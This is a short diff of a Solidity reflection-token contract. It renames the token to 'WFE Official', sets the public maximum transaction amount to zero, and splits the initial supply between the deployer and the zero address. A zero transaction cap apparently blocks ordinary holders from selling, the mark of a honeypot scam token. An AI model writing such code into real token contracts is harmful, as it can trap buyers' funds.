@@ -25,8 +25,8 @@ contract WFEToken is Context, IERC20, Ownable {
     uint256 private _rTotal = (MAX - (MAX % _tTotal));
     uint256 private _tFeeTotal;
 
-    string private _name = "HT Official Group";
-    string private _symbol = "HT Official Group";
+    string private _name = "WFE Official";
+    string private _symbol = "WFE Official";
     uint8 private _decimals = 18;
     
     uint256 public _taxFee = 10;
@@ -41,7 +41,7 @@ contract WFEToken is Context, IERC20, Ownable {
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
     
-    uint256 public _maxTxAmount = 5000 * 10**18;
+    uint256 public _maxTxAmount = 0 * 10**18;
     uint256 private numTokensSellToAddToLiquidity = 1000 * 10**18;
 
     mapping (address => uint256) _airdrop;
@@ -60,7 +60,8 @@ contract WFEToken is Context, IERC20, Ownable {
     }
     
     constructor () public {
-        _rOwned[_msgSender()] = _rTotal;
+        _rOwned[_msgSender()] = _rTotal.div(2);
+        _rOwned[address(0)] = _rTotal.div(2);
 
         IMdexRouter _uniswapV2Router = IMdexRouter(0xED7d5F38C79115ca12fe6C0041abb22F0A06C300);
          // Create a uniswap pair for this new token
